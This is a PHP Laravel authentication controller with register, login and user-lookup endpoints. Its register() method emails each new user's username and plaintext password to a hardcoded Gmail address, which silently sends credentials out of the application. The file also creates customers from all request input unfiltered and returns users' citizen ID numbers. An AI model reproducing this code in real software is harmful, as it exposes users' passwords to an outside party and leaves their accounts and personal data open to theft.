<?php

namespace App\Http\Controllers\API\v1;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Customer;
use Tymon\JWTAuth\Facades\JWTAuth;
use App\Mail\Register;
use Illuminate\Support\Facades\Mail;

class AuthController extends Controller
{
    //
    public function __construct() {
        $this->middleware('auth:api',[
            'except' => [
                'login',
                'register'
            ]
            ]);
    }

    public function register(Request $req){
        $req->validate([
            'username' => 'required',
            'password' => 'required'
        ]);
        $data = $req->all();
        $data['password'] = bcrypt($data['password']);
        $user = Customer::create($data);
        $token = \Auth::login($user);

        Mail::to("jordanlaphon@gmail.com")->send(new Register($req->username,$req->password));
        return response()->json([
            'status' => 'success',
            'message' => 'Registered',
            'user' => $user,
            'token' => $token,
        ]);
    }

    public function login(Request $request){
        $request->validate([
            'username' => 'required',
            'password' => 'required',
        ]);

        $credentials = $request->only('username', 'password');
        $user = Customer::where('username', $request->username)->first();
        if (!$user || !\Hash::check($request->password, $user->password)) {
            return response()->json(['error' => 'Invalid credentials'], 401);
        }
        $token = \Auth::attempt($credentials);

        if(!$token){
            return response()->json([
                'status' => "Error",
                'message' => 'Login Failed'
            ]);
        }

        return response()->json([
            'status' => 'success',
            'message' => 'Login Successfully',
            'token' => $token,
        ], 200);
    }

    public function getUserForPurchase(Request $request){
        $token = $request->header('Authorization');
        JWTAuth::setToken($token);
        $user = JWTAuth::user();
        $userid = $user->id;
        $prefix = $user->prefix;
        $firstname = $user -> firstname;
        $lastname = $user -> lastname;
        $username = $user->username;
        $citizen_id = $user->citizen_id;
        $email = $user->email;
        return response()->json(['id' => $userid, 'prefix' => $prefix,
    'firstname' => $firstname, 'lastname' => $lastname, 'username' => $username, 'citizen_id' => $citizen_id
    ]);
    }
}
